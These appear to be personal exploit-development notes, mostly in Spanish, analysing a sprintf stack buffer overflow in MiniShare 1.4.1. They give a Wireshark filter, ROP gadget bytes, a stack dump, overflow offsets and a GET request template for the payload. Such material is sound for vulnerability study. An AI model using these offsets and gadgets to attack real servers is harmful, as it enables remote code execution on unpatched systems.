Wireshark.

ip.addr == 192.168.1.25 and tcp.port in {80} and ip.src == 192.168.1.4 and http.request.method == "GET"

Pattern Start ROP.
81 C4 68 0C 00 00 5B C3

max size url = 8192
[esp] = numero_de_conexion_k_1
[esp + 4] = ptr_buf = msg (Origen: Vulnerabilidad size)
[esp + 8] = size_buffer = k_8192

2: [esp+4] 0040E284 "Server started (MiniShare 1.4.1)."
Output = date + [esp+4]

"%s (%d) %s\n" = date + (conexion) + msg = peticion


[esp], ebx = ptr_buf_destino = (Causa: Apunta a una direccion del stack) 
[esp + 4], eax = format
int sprintf ( char * str, const char * format, ... );

ptr_buf_destino = 0x015731E8
ptr_buf_request = 0x01579B68


sprintf(ptr_buf_destino, ptr_formato, ptr_fecha,  k_1, ptr_buf_request)


$-8      01573900                   0157BB90      
$-4      01573904                   0040A04D      return to minishare.handler_http_methods+DD from minishare.JMP.&_strtok
$ ==>    01573908                   00000001      
$+4      0157390C <&buf_request>    01579B68      <buf_request>
$+8      01573910                   00002000      
$+C      01573914                   00000000      


buf_url + message_log

Nuevo  Stack = 3176 + ret
	[ESP] = 3176 << Nuevo stack
	...
	... delta = 1360
	...
	...
	[ESP + 1360] = ptr_start_bug = 0040AB3 | 8D | LEA EBX,DWORD PTR SS:[ESP+0x550]      | Bug maldito
	...
	... delta = 1816
	...	
ESP = EBP
RET



GET /{} HTTP/1.1\r\n\r\n